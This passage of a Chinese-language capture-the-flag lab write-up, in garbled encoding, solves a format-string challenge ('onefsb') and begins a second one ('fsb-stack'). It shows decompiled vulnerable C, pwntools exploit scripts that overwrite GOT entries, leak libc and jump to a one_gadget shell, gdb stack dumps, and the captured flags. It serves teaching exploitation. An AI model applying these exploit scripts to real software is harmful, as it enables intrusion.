</span></span></code></pre></td></tr></table></div></div><p>è¿è¡Œåæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src=https://s2.loli.net/2024/07/29/5fQkt6G91YDpjPn.png loading=lazy alt=image-20240727205158947.png></p><p>å¾—åˆ° flag ä¸º <code>AAA{r0p_oN3_5Im3_ROP_f0r3ve3}</code></p><h2 id=task3-onefsb>Task3 onefsb</h2><p>æœ¬é¢˜ç›®çš„å®Œæ•´ä»£ç ä¸º attachment ä¸­çš„ <code>pwnlab2_task3_code.py</code></p><h3 id=preparation-1>Preparation</h3><p>checksec ä¸€ä¸‹ï¼Œæ˜¯å…³é—­äº† PIE ä¿æŠ¤ï¼ŒåŒæ—¶æ‰“å¼€çš„ Partial RELRO çš„ 64 ä½ç¨‹åºï¼Œæ³¨æ„åˆ°å¼€äº† Canaryï¼Œæ ˆæº¢å‡ºè¦å°å¿ƒç‚¹ã€‚</p><p>IDA åç¼–è¯‘ä¸€ä¸‹ï¼Œ<code>main()</code> åŸºæœ¬é€»è¾‘æ˜¯è¿™æ ·çš„ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-110h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v36</span><span class=p>;</span> <span class=c1>// [rsp+108h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v36</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span> <span class=c1>// è®¾ç½® Canary
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>initbuf</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;what&#39;s your message: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>)</span> <span class=c1>// å°† [rbp-110h] å¼€å§‹åˆ° [rbp-11h] å…± 256 ä¸ªå­—èŠ‚çš„å†…å­˜æ¸…é›¶ 
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>fgets</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span> <span class=c1>// ä» s å¼€å§‹è¾“å…¥ 255 256 ä¸ªå­—èŠ‚
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>printf</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;bye&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>åšè¿™é¢˜çš„æ—¶å€™ï¼Œæˆ‘é¦–å…ˆæƒ³åˆ°åˆ©ç”¨ FSB Bug ï¼Œä½¿ç”¨ç±»ä¼¼äºå‰ä¸¤é“ Task çš„æ€è·¯ï¼Œå…ˆæ³„æ¼ <code>main()</code> çš„è¿”å›åœ°å€ä»è€Œè·å¾— libc åœ°å€ï¼Œå¦‚æœä¸æ–¹ä¾¿è·å¾— <code>main()</code> çš„è¿”å›åœ°å€ï¼Œå°±æƒ³åŠæ³•æ³„æ¼å…¶ä»–å‡½æ•°çš„åœ°å€ï¼Œç„¶ååˆ©ç”¨ ROP å°†ç¨‹åº return åˆ° <code>system('/bin/sh')</code> ä¸Šï¼Œä½†æ˜¯å®é™…æ“ä½œæ—¶é‡åˆ°äº†åªæœ‰ä¸€æ¬¡åˆ©ç”¨ FSB çš„æœºä¼šï¼Œè‹¥åŠ«æŒæ§åˆ¶æµå°±ä¸èƒ½æ³„æ¼ <code>main()</code> çš„è¿”å›åœ°å€ ï¼Œç„¶åæ˜¯ <code>printf()</code> ä½¿ç”¨ <code>%u</code> å†™å…¥æ—¶å¯¼è‡´æ®µé”™è¯¯ï¼Œä»¥åŠç›´æ¥å†™ ROP é“¾å¤ªéº»çƒ¦ç­‰å„ç§å›°éš¾</p><p>ç„¶åå°±æ˜¯ï¼ˆè¯·æ±‚åœºå¤–æ´åŠ© sad åå¾—åˆ°çš„ hintï¼‰ Partial RELRO ï¼Œå®ƒå…è®¸æˆ‘ä»¬èƒ½å¤Ÿè¦†å†™ GOT è¡¨ï¼Œå¯ä¸å¯ä»¥è·å– <code>system</code> çš„ GOT è¡¨åœ°å€å°†å…¶è¦†ç›–åˆ° <code>main()</code> è¦è°ƒç”¨çš„ä¸€ä¸ªå‡½æ•°åœ¨ GOT è¡¨ä¸Šçš„åœ°å€ä»è€Œè¾¾åˆ°è°ƒç”¨ <code>system("/bin/sh")</code> çš„æœºä¼šï¼Ÿç»“æœä¹Ÿä¸è¡Œï¼Œä¸€æ¬¡åˆ©ç”¨ FSB çš„é™åˆ¶ä¸èƒ½è®©æˆ‘åšåˆ°è¿™ä¸€ç‚¹ã€‚é‚£èƒ½ä¸èƒ½ç”¨è¦†å†™ GOT è¡¨ä»è€Œåšåˆ°æ— é™åˆ©ç”¨ FSB ? ç­‰ç­‰ï¼Œ<code>main()</code> ç»“æŸå‰æ€ä¹ˆæœ‰ä¸€ä¸ª <code>puts("bye")</code> ï¼Œè±ç„¶å¼€æœ—äº†ï¼šæŠŠ <code>puts_got</code> å˜æˆ <code>main()</code> ï¼Œè¿™æ ·å°±è®©åšå®Œæ¶ä½œå‰§çš„å°é¬¼ç¨‹åºè¢«ç‹ ç‹ è„‘æ§å®šèº«ä»»æˆ‘ä¸ºéä½œæ­¹ ğŸ˜¡ğŸ˜¡ğŸ˜¡ ï¼›è‡³äº ROP é“¾ï¼Œæ¢æˆä¸€ä¸ª one_gadget ï¼Œåœ¨è¿™é‡Œæ‰¾åˆ°çš„æ˜¯è¿™ä¸ªï¼š</p><pre><font color=#D7D7FF>0xebc85</font> execve(&quot;/bin/sh&quot;, <font color=#5FFF00>r10</font>, <font color=#5FFF00>rdx</font>)
<font color=#FF5F5F>constraints</font>:
  address <font color=#5FFF00>rbp</font>-<font color=#D7D7FF>0x78</font> is writable
  [<font color=#5FFF00>r10</font>] == NULL || <font color=#5FFF00>r10</font> == NULL || <font color=#5FFF00>r10</font> is a valid argv
  [<font color=#5FFF00>rdx</font>] == NULL || <font color=#5FFF00>rdx</font> == NULL || <font color=#5FFF00>rdx</font> is a valid envp
</pre><p>åœ¨ç¬¬ä¸€æ¬¡ payloadï¼Œè¦åšçš„å°±æ˜¯ï¼šåŠ«æŒæ§åˆ¶æµï¼Œå°† <code>puts_got</code> è¦†å†™æˆ <code>main()</code> ï¼Œè®©ç¨‹åºæƒ³ &ldquo;bye&rdquo; å´è¢«æˆ‘ç‹ ç‹ è„‘æ§å½“åœºæ‹¿ä¸‹</p><p>ç¬¬äºŒæ¬¡ï¼Œè¾“å‡º <code>printf()</code> åœ°å€ä»è€Œè·å– libc åœ°å€ï¼Œä»è€Œè·å¾— one_gadget çš„åœ°å€</p><p>ç¬¬ä¸‰æ¬¡ï¼Œå°±æ˜¯å°† <code>puts_got</code> è¦†å†™æˆ one_gadget ï¼Œå¯¹æˆ‘è¨€å¬è®¡ä» ğŸ˜¤ğŸ˜¤ğŸ˜¤</p><h3 id=getting-offsets>Getting offsets</h3><p>é¦–å…ˆæ‰“å¼€ç¨‹åºï¼Œç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç›¸å¯¹åç§»ã€‚æ‰“å¼€ç¨‹åºï¼Œè¾“å…¥ <code>AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code> ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src=https://s2.loli.net/2024/07/29/kmynu7LHE4gA6zG.png loading=lazy alt=image-20240728164321356.png></p><p>å¯ä»¥çœ‹åˆ°ï¼Œ <code>AAAAAAAA</code> ï¼Œå³ <code>0x4141414141414141</code> ä½äºæ ¼å¼åŒ–å­—ç¬¦ä¸²åçš„ç¬¬å…­ä¸ªåç§»ã€‚</p><p>ä½¿ç”¨ gdb è°ƒè¯•ï¼Œ è¾“å…¥ <code>AAAAAAAA</code> åæ–­ç‚¹åœ¨ <code>printf()</code> å†…ï¼Œç„¶åçœ‹æ ˆå†…å®¹ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><pre><font color=#C01C28><b>pwndbg&gt; </b></font>x /40gx $rsp
<font color=#12488B>0x7fffffffdac8</font>:	0x000000000040139e	0x4141414141414141
<font color=#12488B>0x7fffffffdad8</font>:	0x000000000000000a	0x0000000000000000
<font color=#12488B>0x7fffffffdae8</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdaf8</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdb08</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdb18</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdb28</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdb38</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdb48</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdb58</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdb68</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdb78</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdb88</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdb98</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdba8</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdbb8</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdbc8</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdbd8</font>:	0xf53edbb42f9f1d00	0x0000000000000001
<font color=#12488B>0x7fffffffdbe8</font>:	0x00007ffff7c29d90	0x0000000000000000
<font color=#12488B>0x7fffffffdbf8</font>:	0x00000000004011fd	0x0000000100000000
<font color=#C01C28><b>pwndbg&gt; </b></font>p $rbp
<font color=#2AA1B3>$3</font> = (void *) <font color=#12488B>0x7fffffffdbe0</font>
<font color=#C01C28><b>pwndbg&gt; </b></font>p $rsp
<font color=#2AA1B3>$4</font> = (void *) <font color=#12488B>0x7fffffffdac8</font>
</pre><p>å¯ä»¥çœ‹åˆ°ï¼Œè¾“å…¥çš„æ ¼å¼å­—ç¬¦ä¸² <code>AAAAAAAA</code> ä½äºæ ˆçš„ç¬¬äºŒä½ï¼Œç”±äºæ­¤æ—¶ä½äº <code>printf()</code> å‡½æ•°å†…ï¼Œ <strong>æ ˆçš„æœ€é¡¶éƒ¨ rbp æŒ‡å‘çš„æ˜¯ <code>printf()</code> çš„è¿”å›åœ°å€ï¼Œæ‰€ä»¥ä¸ç®—åšå‚æ•°</strong>ï¼ŒåŒæ—¶ç”±äºæ˜¯ 64 ä½ç¨‹åºï¼Œå‰å…­ä¸ªå‚æ•°åœ¨å¯„å­˜å™¨å†…ï¼Œæ‰€ä»¥æ ¼å¼å­—ç¬¦ä¸²å°±æ˜¯ <code>printf()</code> çš„ç¬¬ä¸ƒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆ rdi ï¼‰åçš„ç¬¬å…­ä¸ªåç§»ã€‚</p><h3 id=hijacking-control-flow>Hijacking control flow</h3><p>é¦–å…ˆå°±æ˜¯æ‹¿ä¸‹ <code>puts()</code> ï¼Œåƒè¿™æ ·æ„å»º payload ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>puts_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>printf_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>printf_offset</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1># pause()</span>
</span></span><span class=line><span class=cl><span class=n>main_addr</span> <span class=o>=</span> <span class=mh>0x4011fd</span> 
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>fmtstr_payload</span><span class=p>(</span><span class=mi>6</span><span class=p>,{</span><span class=n>puts_got</span><span class=p>:</span><span class=n>main_addr</span><span class=p>},</span><span class=n>write_size</span><span class=o>=</span><span class=s2>&#34;short&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;what&#39;s your message: &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿è¡Œï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src=https://s2.loli.net/2024/07/29/jsaKU3qtSnzMcm2.png loading=lazy alt=image-20240728224258130.png></p><h3 id=leaking-libc-address>Leaking libc address</h3><p>æœ‰äº†å‰é¢ä¸¤é“ Task çš„ç»éªŒï¼Œè¿™æ¬¡ leak å¯ä»¥ç®—å¾ˆé¡ºåˆ©äº†ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Second payload: leaking libc address</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%7$sKKKK&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>printf_got</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;what&#39;s your message: &#34;</span><span class=p>,</span> <span class=n>payload2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>recv</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;KKKK&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>recv</span> <span class=o>=</span> <span class=n>recv</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;KKKK&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>recv</span> <span class=o>=</span> <span class=n>recv</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>printf_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>recv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_addr</span> <span class=o>=</span> <span class=n>printf_addr</span> <span class=o>-</span> <span class=n>printf_offset</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;printf_addr =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>printf_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_addr   =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src=https://s2.loli.net/2024/07/29/5XrJbkKFaWAp3P9.png loading=lazy alt=image-20240728225353011.png></p><p>å¯ä»¥çœ‹åˆ°æœ€ç»ˆå¾—åˆ°çš„ libc åœ°å€ä¸º <code>0x00007F3EDFC00000</code></p><h3 id=getting-system-shell-2>Getting system shell</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Third payload: getting system shell</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi_addr</span> <span class=o>=</span> <span class=mh>0x000000000002a3e5</span> <span class=o>+</span> <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl><span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>))</span> <span class=o>+</span> <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl><span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl><span class=n>one_gadget</span> <span class=o>=</span> <span class=mh>0xebc85</span> <span class=o>+</span> <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl><span class=n>payload3</span> <span class=o>=</span> <span class=n>fmtstr_payload</span><span class=p>(</span><span class=mi>6</span><span class=p>,{</span><span class=n>puts_got</span><span class=p>:</span><span class=n>one_gadget</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;what&#39;s your message: &#34;</span><span class=p>,</span> <span class=n>payload3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src=https://s2.loli.net/2024/07/29/ybIgmqwYWkE7XUQ.png loading=lazy alt=image-20240728225703142.png></p><p>æˆåŠŸè·å– shell çš„æ§åˆ¶æƒã€‚æœ€ç»ˆå¾—åˆ° flag ä¸º <code>AAA{i_l0v3_fmtstr_payload_H0p3_u_Loveit_2}</code> ï¼Œç„¶è€Œæˆ‘è‡ªæˆ‘æ„Ÿè§‰ä¹Ÿè®¸å¯èƒ½ä¸ä¼šå¾ˆ love it :D å¡äº†æˆ‘ä¸¤å¤©ï¼ˆæ€¨ï¼‰</p><h2 id=task4-fsb-stack>Task4 fsb-stack</h2><p>æœ¬é¢˜ç›®çš„å®Œæ•´ä»£ç ä¸º attachment ä¸­çš„ <code>pwnlab2_task4_code.py</code></p><h3 id=preparation-2>Preparation</h3><p><code>checksec</code> ä¸€ä¸‹ï¼Œé™¤äº† Canary ä»¥å¤–ä¿æŠ¤å…¨å¼€ï¼ˆåœ¨ IDA é‡Œåæ±‡ç¼–ä¹Ÿæ²¡çœ‹åˆ° stack_check_fail ï¼‰ã€‚ <code>main()</code> åç¼–è¯‘åçš„ä»£ç å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=n>__noreturn</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>s</span><span class=p>[</span><span class=mi>66</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-210h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>s</span><span class=p>[</span><span class=mi>65</span><span class=p>]</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>initbuf</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>512</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x200uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>s</span><span class=p>,</span> <span class=mi>512</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>((</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è‡ªå¸¦æ— é™æ¬¡ä½¿ç”¨æ¬¡æ•°çš„ FSB ã€‚æ‰“å¼€ç¨‹åºï¼Œè¾“å…¥ <code>AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p</code> ç¡®è®¤æ ¼å¼å­—ç¬¦ä¸²åç§»ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src=https://s2.loli.net/2024/07/29/uNBpfj9A6l2Q4Dv.png loading=lazy alt=image-20240728230716046.png></p><p>å¯ä»¥çœ‹åˆ° <code>AAAAAAAA</code> ä½äºæ ¼å¼å­—ç¬¦ä¸²åç¬¬å…­ä¸ªåç§»ã€‚</p><p>ç›®å‰çš„æƒ³æ³•å°±æ˜¯ï¼Œé€šè¿‡ <code>printf()</code> æ³„æ¼å‡º <code>main()</code> çš„è¿”å›åœ°å€å¾—åˆ° libc åœ°å€ã€‚</p><p>ä½†æ˜¯æ‰“å¼€äº† FULL RELRO ï¼Œä¸èƒ½è¦†å†™ GOT è¡¨ï¼Œæ‰€ä»¥è¯•è¯• ROPï¼Œåˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²ä»»æ„ä½ç½®æ³„æ¼æ ˆåœ°å€ï¼Œç„¶ååˆ©ç”¨ä»»æ„å†™å°† <code>printf()</code> çš„è¿”å›åœ°å€è®¾ä¸º one_gadgetã€‚</p><h3 id=leaking-libc-address-1>Leaking libc address</h3><p>é€šè¿‡ gdb åŠ¨æ€è°ƒè¯•ï¼Œæ–­ç‚¹è¿›å…¥ <code>printf()</code> å†…ï¼Œåœ¨æ ˆä¸­å¯»æ‰¾åˆ° <code>main()</code> çš„è¿”å›åœ°å€ç›¸å¯¹äºæ ¼å¼å­—ç¬¦ä¸²çš„åç§»ä½ç½®ã€‚é¦–å…ˆæ¥çœ‹ Backtrace ï¼Œç¡®å®š <code>printf()</code> çš„è¿”å›åœ°å€ä¸º <code>0x55555555528d</code> ï¼Œä½äº <code>main()</code> å†…ï¼Œåˆ™ <code>main()</code> çš„è¿”å›åœ°å€ä¸º <code>0x7ffff7c29d90</code> ï¼Œè€Œ <code>0x7ffff7c29e40</code> ç›¸å¯¹ <code>__libc_start_main</code> çš„åç§»æ˜¯ +128 ï¼Œæ‰€ä»¥ <code>__libc_start_main</code> ç›¸å¯¹ <code>main()</code> çš„è¿”å›åœ°å€ çš„åç§»æ˜¯ (-0xd90 + 0xe40) - 128 = +0x30 ã€‚</p><pre><font color=#12488B>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</font>
 â–º 0   0x7ffff7c606f0 printf
   1   0x55555555528d
   2   0x7ffff7c29d90
   3   0x7ffff7c29e40 __libc_start_main+128
   4   0x5555555550e5
<font color=#12488B>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</font>
<font color=#C01C28><b>pwndbg&gt; </b></font>
</pre><p>æ¥ä¸‹æ¥ï¼Œåœ¨æ ˆä¸­æ‰¾åˆ° <code>0x7ffff7c29d90</code> ç›¸å¯¹äºæ ¼å¼å­—ç¬¦ä¸²çš„åç§»ä½ç½®ï¼š</p><pre><font color=#12488B>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</font>
<font color=#C01C28><b>pwndbg&gt; </b></font>x /100gx $rsp
<font color=#12488B>0x7fffffffd9c8</font>:	0x000055555555528d	0x7944734973696854
<font color=#12488B>0x7fffffffd9d8</font>:	0x7375446c65674e41	0x000000000a726574
<font color=#12488B>0x7fffffffd9e8</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffd9f8</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>< Skipped ></font>
<font color=#12488B>0x7fffffffdbc8</font>:	0x0000000000000000	0x0000000000000000
